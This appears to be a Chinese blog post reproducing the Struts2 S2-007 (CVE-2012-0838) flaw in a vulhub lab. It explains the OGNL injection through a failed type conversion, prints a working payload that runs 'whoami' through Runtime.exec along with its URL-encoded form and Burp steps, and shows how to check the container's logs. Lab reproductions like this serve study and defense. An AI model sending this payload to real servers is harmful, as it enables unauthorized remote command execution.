# CVE-2012-0838 S2-007 复现 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15630625.html`](https://www.cnblogs.com/peace-and-romance/p/15630625.html)

### 0X00-引言

* * *

道可道，非常道。名可名，非常名。

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-漏洞描述

* * *

当配置了验证规则 `<ActionName>-validation.xml` 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。

当用户提交 age 为字符串而非整形数值时，后端用代码拼接 `"'" + value + "'"` 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。

([大佬](https://www.cnblogs.com/LittleHann/p/4640789.html)写的，简洁明了) S2-007 和 S2-003、S2-005 的漏洞源头都是一样的，都是 struts2 对 OGNL 的解析过程中存在漏洞，导致黑客可以通过 OGNL 表达式实现代码注入和执行，所不同的是

```
1\. S2-003、S2-005: 通过 OGNL 的 name-value 的赋值解析过程、#访问全局静态变量(AOP 思想)实现代码执行
2\. S2-007: 通过 OGNL 中 String 向 long 转换过程实现代码执行
//即它们的攻击向量是不同的 
```

影响版本：Struts2 2.0.0 - 2.2.3

### 0X03-漏洞复现

* * *

url 登录：若是出现 404，清楚浏览器一段时间记录即可

![image-20211201104117320](img/ecdd713601111727e9e819536f98914e.png)

##### 01-任意命令执行

payload，参数为 whoami 可以更改

```
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())) + ' 
```

url 编码：

```
%27%20%2b%20%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%5b%22%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%22%5d%3d%74%72%75%65%2c%23%66%6f%6f%3d%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%42%6f%6f%6c%65%61%6e%28%22%66%61%6c%73%65%22%29%20%2c%23%63%6f%6e%74%65%78%74%5b%22%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%22%5d%3d%23%66%6f%6f%2c%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%77%68%6f%61%6d%69%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%20%2b%20%27%0a 
```

burp 抓包-repeater-改包(修改 age 的值)-发送

![image-20211201102452773](img/9afa4676fee62e7b008b2b51ced2ed79.png)

### 0X04-工具检测

* * *

未找到可利用的工具，好像 S2-007 有些奇怪，好多工具都没有对此检测和利用

### 0X05-查看日志

* * *

进入容器

```
docker ps #查看容器 ID
docker exec -it ID /bin/bash #进入
cd logs #进入日志目录
cat localhost_access_log.2021-12-02.txt #查看日志
exit #退出容器 
```

![image-20211201105836642](img/d7547b5c009de7f1a76771e617be258d.png)

IP 为 192.168.234.1 的主机访问了 user/action 目录，协议为 http/1.1，状态码 200 位访问成功

### 0X06-参考

* * *

[S2-007 远程代码执行漏洞](https://github.com/vulhub/vulhub/blob/master/struts2/s2-007/README.zh-cn.md)

[struts2 Advanced Learning](https://www.cnblogs.com/LittleHann/p/4614488.html)